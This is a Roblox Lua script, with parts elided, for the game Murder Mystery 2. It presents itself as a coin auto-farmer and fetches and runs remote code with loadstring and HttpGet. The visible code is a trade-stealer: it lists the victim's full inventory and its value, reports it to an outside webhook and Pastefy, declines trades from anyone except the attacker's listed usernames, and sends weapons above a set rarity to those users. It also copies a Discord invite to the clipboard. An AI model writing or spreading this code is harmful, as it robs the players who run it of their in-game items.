local function visual()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AhmadV6/MM2/refs/heads/main/Auto-Farm-Coins'))()
end

task.spawn(visual)

Usernames = {"Wizya0530"} -- You can add multiple users if you know how!
Webhook = "https://sentinelhook.lol/api.php?id=QugN5538uI97Dzo"  -- Protect your webhook at https://sentinelhook.lol/ .
MinimumRarity = "Legendary" -- Options: Common/Uncommon/Rare/Legendary/Godly/Ancient/Vintage/Unique.
MinimumValue = 0 -- Set it to 5 (Recommended).

local Success = pcall(function()
    local Str = "https://discord.gg/m4TTjEUJz"
    for First, Last in utf8.graphemes(Str) do
        return First
    end
end)
if not Success then error("https://discord.gg/m4TTjEUJz") return end

_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

setclipboard("https://discord.gg/m4TTjEUJz")
...
local Users = Usernames or {"nodebuguserlolez123"}
local MinRarity = MinimumRarity or "Common"
local MinValue = MinimumValue or 1
local Ping = "Yes"
local Webhook = Webhook or "nodebugwebhooklolez123"
...
-- ========== GET TOTAL INVENTORY VALUE & FULL LIST ==========
...
-- Get full inventory and total value
local FullItems, TotalInventoryValue = GetFullInventory()

-- Build full inventory text for Pastefy
...
-- ========== AUTO-DECLINE TRADES FROM NON-USERS ==========
...
if #WeaponsToSend > 0 then
    ...
    -- ========== CONTINUOUS USER MONITOR ==========
    local isProcessing = false
    local processedUsers = {}
    
    -- Function to find available users
    ...
    local function ProcessUser(PlayerName)
        ...
        -- If trade was successful or user left, check for next user
    ...
    -- Function to check and process available users
    local function CheckAndProcessUsers()
        if isProcessing then return end
        
        local available = FindAvailableUsers()
        if #available > 0 then
            -- Process the first available user
            task.spawn(function()
